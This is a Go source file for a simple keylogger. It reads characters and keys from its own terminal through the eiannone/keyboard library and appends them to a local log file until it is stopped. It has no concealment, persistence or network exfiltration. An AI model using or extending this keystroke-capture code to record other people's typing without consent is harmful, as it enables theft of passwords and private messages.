package main

import (
	"log"
	"os"
	"os/signal"
	"syscall"

	"github.com/eiannone/keyboard"
)

func main() {
	// Open the log file
	logFile, err := os.OpenFile("./logs/keylogger.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("Failed to open log file: %v", err)
	}
	defer logFile.Close()

	// Configure logger to write to the file
	log.SetOutput(logFile)

	// Initialize the keyboard listener
	if err := keyboard.Open(); err != nil {
		log.Fatalf("Failed to initialize keyboard listener: %v", err)
	}
	defer keyboard.Close()

	log.Println("Keylogger started...")

	// Handle graceful shutdown on system signals
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		for {
			char, key, err := keyboard.GetKey()
			if err != nil {
				log.Printf("Error reading key: %v", err)
				continue
			}

			// Log both key and character
			if char != 0 {
				log.Printf("Char: %q", char)
			}
			if key != 0 {
				log.Printf("Key pressed :%v",key)
			}
		}
	}()

	// Wait for termination signal
	<-signalChan
	log.Println("Keylogger shutting down...")
}
